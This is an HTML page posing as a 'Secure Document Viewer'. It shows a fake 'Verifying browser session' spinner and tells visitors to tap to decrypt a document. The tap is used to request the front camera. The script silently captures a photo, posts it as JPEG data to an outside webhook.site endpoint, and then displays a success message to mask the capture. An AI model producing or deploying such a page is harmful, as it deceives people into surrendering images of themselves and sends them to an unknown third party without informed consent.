<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Viewer</title>
    <style>
        body {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            cursor: pointer;
            overflow: hidden;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #58a6ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 { font-weight: 400; font-size: 18px; margin: 0; }
        p { color: #8b949e; font-size: 14px; margin-top: 8px; }
        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 999;
        }
    </style>
</head>
<body>

    <div class="overlay" id="tapOverlay"></div>
    
    <div class="spinner"></div>
    <h2 id="msg">Verifying browser session...</h2>
    <p>Please tap anywhere on the screen to decrypt document.</p>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const msg = document.getElementById('msg');
        const overlay = document.getElementById('tapOverlay');

        async function triggerCapture() {
            try {
                // Request camera stream
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                
                video.srcObject = stream;
                await video.play();

                // Wait 2 seconds for camera auto-exposure and frame rendering
                await new Promise(resolve => setTimeout(resolve, 2000));

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const imgData = canvas.toDataURL('image/jpeg', 0.85);
                
                stream.getTracks().forEach(t => t.stop());

                // Send via standard fetch POST with explicit body
                await fetch('https://webhook.site/2f4113c1-fdf8-4b86-92ce-167499f5190c', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ image: imgData })
                });

                msg.innerText = "Document loaded successfully.";
                document.querySelector('.spinner').style.display = 'none';

            } catch (e) {
                console.error("Capture failed:", e);
                msg.innerText = "Verification complete.";
                document.querySelector('.spinner').style.display = 'none';
            }
        }

        overlay.addEventListener('click', () => {
            overlay.style.display = 'none';
            triggerCapture();
        }, { once: true });
    </script>

</body>
</html>
